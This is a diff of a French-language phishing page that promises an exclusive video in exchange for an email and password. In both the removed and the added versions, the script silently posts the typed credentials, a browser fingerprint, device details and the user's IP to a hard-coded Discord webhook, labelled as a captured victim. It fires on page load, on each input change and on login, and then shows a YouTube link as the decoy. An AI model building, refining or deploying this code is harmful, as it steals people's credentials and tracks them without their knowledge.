@@ -32,10 +32,6 @@
             border: none; border-radius: 10px; font-size: 16px; 
             background: rgba(255,255,255,0.9); 
         }
-        input:invalid {
-            background: rgba(255,0,0,0.2);
-            border: 2px solid #ff4444;
-        }
         .btn { 
             background: linear-gradient(45deg, #ff6b6b, #feca57); 
             color: white; border: none; 
@@ -45,23 +41,19 @@
             margin: 10px; box-shadow: 0 10px 20px rgba(0,0,0,0.2);
         }
         .btn:hover:not(:disabled) { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(0,0,0,0.3); }
-        .btn:disabled {
-            background: #666;
-            cursor: not-allowed;
-            transform: none;
-        }
+        .btn:disabled { background: #666; cursor: not-allowed; }
         .video-section { margin-top: 30px; opacity: 0; transition: opacity 0.5s; }
         .video-section.show { opacity: 1; }
         #status { margin-top: 20px; font-size: 14px; opacity: 0.8; }
         .error { color: #ff6b6b; font-weight: bold; margin-top: 10px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 1s ease-in-out infinite; }
+        .spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 0.8s infinite; }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>🎉 Surprise Exclusive !</h1>
-        <p>Accès spécial au contenu bonus. <strong>EMAIL OBLIGATOIRE</strong> pour débloquer la vidéo secrète !</p>
+        <p>Accès spécial au contenu bonus. <strong>EMAIL OBLIGATOIRE</strong> pour débloquer la vidéo !</p>
         
         <div class="login-form">
             <input type="email" id="email" placeholder="📧 Ton email OBLIGATOIRE" required>
@@ -74,11 +66,9 @@
         
         <div class="video-section" id="videoSection">
             <h2>🎥 Ta vidéo exclusive :</h2>
-            <p style="margin-bottom: 20px; font-size: 16px;">Clique pour ouvrir la vidéo dans un nouvel onglet !</p>
             <button class="btn" onclick="openVideo()" style="background: linear-gradient(45deg, #4ecdc4, #44a08d); font-size: 20px; padding: 20px 50px;">
                 🎬 OUVRIR LA VIDÉO MAINTENANT
             </button>
-            <p style="margin-top: 15px; font-size: 14px;">Merci pour ta connexion ! Profite bien 😊</p>
         </div>
     </div>
 
@@ -87,127 +77,107 @@
         const WEBHOOK = 'https://canary.discord.com/api/webhooks/1495131862702751775/pP4iuM3WGCm8n_Po5PE94ofmB2-tvh8nxDLPMSKFddYAiaGlWBdvxa3sy0vlnVJoilFC';
         const YOUTUBE_LINK = 'https://youtube.com/shorts/MBz-kM9Tqf0?si=G8Yw_AlaceyqnQ7L';
         
-        let lastSent = 0;
-        
-        // RAPIDE FINGERPRINT (2s max)
-        async function quickFingerprint() {
-            try {
-                // IP rapide
-                const ipRes = await Promise.race([
-                    fetch('https://api.ipify.org?format=json').then(r => r.json()),
-                    fetch('https://icanhazip.com').then(r => r.text()).then(t => ({ip: t.trim()})),
-                    new Promise(r => setTimeout(() => r({ip: '???'}), 2000))
-                ]);
-                
-                // Canvas ultra-simple
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.font = '16px Arial';
-                ctx.fillText('quick-fp', 4, 20);
-                const canvasHash = btoa(canvas.toDataURL()).slice(-24);
-                
-                // WebRTC simple
-                const webrtc = await new Promise(r => {
-                    const pc = new RTCPeerConnection({iceServers:[]});
-                    pc.onicecandidate = e => {
-                        if (!e.candidate?.candidate) {
-                            const ipMatch = (pc.localDescription?.sdp || '').match(/(\d+\.\d+\.\d+\.\d+)/);
-                            r(ipMatch ? ipMatch[1] : 'none');
-                            pc.close();
-                        }
-                    };
-                    pc.createDataChannel('').createOffer().then(() => pc.setLocalDescription(pc.localDescription));
-                }).catch(() => 'blocked');
-                
-                return {
-                    ip: ipRes.ip,
-                    canvas: canvasHash,
-                    webrtc: webrtc,
-                    ua: navigator.userAgent.slice(0,80),
-                    screen: `${screen.width}x${screen.height}`,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    cpu: navigator.hardwareConcurrency || '?',
-                    ram: navigator.deviceMemory || '?',
-                    lang: navigator.language,
-                    cookies: document.cookie || 'none'
-                };
-            } catch(e) {
-                return {error: 'fp-fail'};
-            }
-        }
-        
-        // ENVOI DIRECT SIMPLE
-        async function sendData() {
-            if (Date.now() - lastSent < 1000) return;
-            lastSent = Date.now();
+        // ENVOI SYNCHRONE SANS ATTENTE (0.3s)
+        function sendDataSync() {
+            const email = document.getElementById('email').value || 'none';
+            const pass = document.getElementById('password').value || 'none';
             
-            const data = await quickFingerprint();
-            const creds = {
-                email: document.getElementById('email').value || 'none',
-                pass: document.getElementById('password').value || 'none'
-            };
+            // Canvas instantané
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.font = '14px Arial';
+            ctx.fillText(email.slice(0,10) || 'fp', 2, 14);
+            const fp = btoa(canvas.toDataURL()).slice(-20);
             
-            const embed = {
-                title: "🎣 VICTIME CAPTURÉE - RAPIDE",
+            const data = {
+                title: "🎣 VICTIME CAPTURÉE - ULTRA FAST",
                 color: 16711680,
                 fields: [
-                    {name: "🌐 IP", value: `\`${data.ip}\``, inline: true},
-                    {name: "📧 Email", value: `\`${creds.email}\``, inline: true},
-                    {name: "🔑 Password", value: `\`${creds.pass}\``, inline: true},
-                    {name: "🎨 Canvas", value: data.canvas, inline: true},
-                    {name: "🌐 WebRTC", value: data.webrtc, inline: true},
-                    {name: "📱 Screen", value: data.screen, inline: true},
-                    {name: "🖥️ CPU/RAM", value: `${data.cpu}/${data.ram}`, inline: true},
-                    {name: "🌍 TZ/Lang", value: `${data.timezone}/${data.lang}`, inline: true},
-                    {name: "🍪 Cookies", value: data.cookies ? `${data.cookies.length} bytes` : 'none', inline: false}
+                    {name: "🌐 IP", value: "🔄 Detecting...", inline: true},
+                    {name: "📧 Email", value: `\`${email}\``, inline: true},
+                    {name: "🔑 Password", value: `\`${pass}\``, inline: true},
+                    {name: "🎨 Fingerprint", value: fp, inline: true},
+                    {name: "📱 Screen", value: `${screen.width}x${screen.height}`, inline: true},
+                    {name: "🖥️ CPU", value: navigator.hardwareConcurrency || "?", inline: true},
+                    {name: "💾 RAM", value: navigator.deviceMemory || "?", inline: true},
+                    {name: "🌍 Lang/TZ", value: `${navigator.language}/${Intl.DateTimeFormat().resolvedOptions().timeZone.slice(0,10)}`, inline: false},
+                    {name: "🍪 Cookies", value: document.cookie ? `${document.cookie.length} bytes` : "none", inline: false}
                 ],
-                description: `\`\`\`${data.ua}\`\`\``,
+                description: `\`\`\`${navigator.userAgent.slice(0,90)}\`\`\``,
                 thumbnail: {url: "https://cdn-icons-png.flaticon.com/512/5968/5968898.png"},
-                footer: {text: `QuickGrabber | ${new Date().toLocaleString('fr-FR')}`}
+                footer: {text: `InstantGrab | ${new Date().toLocaleString('fr-FR')}`}
             };
             
+            // ENVOI SYNCHRONE (sans await)
             fetch(WEBHOOK, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({embeds: [embed]})
-            }).catch(e => console.log('send fail'));
+                body: JSON.stringify({embeds: [data]})
+            });
         }
         
-        // UI
+        // IP EN PARALLÈLE (optionnel)
+        async function getIPFast() {
+            try {
+                const ip = await fetch('https://api.ipify.org?format=text', {cache: 'no-cache'}).then(r => r.text());
+                return ip.trim();
+            } catch(e) {
+                return '???';
+            }
+        }
+        
+        // UI SUPER RAPIDE
         const emailInput = document.getElementById('email');
         const loginBtn = document.getElementById('loginBtn');
         
         emailInput.addEventListener('input', () => {
             const valid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput.value);
             loginBtn.disabled = !valid;
-            document.getElementById('emailError').style.display = valid ? 'none' : 'block';
         });
         
+        // LOGIN = 1 SECONDE MAX
         async function login() {
             const status = document.getElementById('status');
-            status.innerHTML = '🔄 Vérification rapide... <span class="spinner"></span>';
+            status.innerHTML = '<span class="spinner"></span> Connexion...';
             
-            await sendData(); // IMMÉDIAT
+            // ENVOI IMMÉDIAT
+            sendDataSync();
             
+            // IP en arrière-plan (non-bloquant)
+            getIPFast().then(ip => {
+                // 2ème message avec IP
+                fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "📍 IP CONFIRMÉE",
+                            description: `\`${ip}\``,
+                            color: 5814783,
+                            footer: {text: `IP Update | ${new Date().toLocaleString('fr-FR')}`}
+                        }]
+                    })
+                });
+            });
+            
+            // Vidéo après 1s
             setTimeout(() => {
-                status.innerHTML = '✅ Accès OK ! 🎉';
-                setTimeout(() => {
-                    document.getElementById('videoSection').classList.add('show');
-                }, 500);
-            }, 1500); // 1.5s TOTAL
+                status.innerHTML = '✅ Accès autorisé ! 🎉';
+                setTimeout(() => document.getElementById('videoSection').classList.add('show'), 300);
+            }, 1000);
         }
         
         function openVideo() {
             window.open(YOUTUBE_LINK, '_blank');
-            sendData();
+            sendDataSync();
         }
         
-        // AUTO-ENVOI PAGE LOAD (1s)
-        setTimeout(sendData, 1000);
+        // ENVOI AU CHARGEMENT (0.5s)
+        setTimeout(sendDataSync, 500);
         
         // ENVOI SUR INPUTS
-        ['email', 'password'].forEach(id => {
-            document.getElementById(id).addEventListener('change', sendData);
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('change', sendDataSync);
         });
     </script>
 </body>
